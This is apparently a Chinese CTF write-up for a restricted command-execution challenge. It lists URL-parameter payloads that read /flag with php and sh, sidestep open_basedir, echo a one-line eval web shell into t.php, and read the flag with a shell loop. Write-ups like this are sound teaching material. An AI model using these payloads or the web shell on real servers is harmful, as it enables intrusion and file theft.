## 题目名称
命令执行

## 题目描述
命令执行，你行不行。老前辈说过“最安全的系统就是什么都没有”

## 出题/解题思路
没有命令怎么执行命令

```
# 方法一、php+文件，文件内容会被当成php代码执行，相当于include
/?xbx=php /flag

/?xbx=php -h
# 方法二、指定根目录，绕过open_basedir
/?xbx=php -t / -r "include('/flag');"

# 方法三、使用空配置文件（默认配置）执行php代码
/?xbx=>php.ini
/?xbx=php -c php.ini -r "include('/flag');"

# 方法四、sh+文件，并输出错误信息（蚁剑是这个原理）
/?xbx=sh /flag 2>&1
/?xbx=sh%20/flag%202>%261
2>&1 的意思就是将标准错误重定向到标准输出

# 其他：echo还是能用的，可以写shell但是没什么实际用处，很多函数都被禁了，如果做出来就是非预期
/?xbx=echo "<?php eval(\$_POST['t']);" > t.php
```

非预期，shell脚本读
```
#!/bin/sh
while read LINE; do
echo $LINE
done < /flag
```

## flag
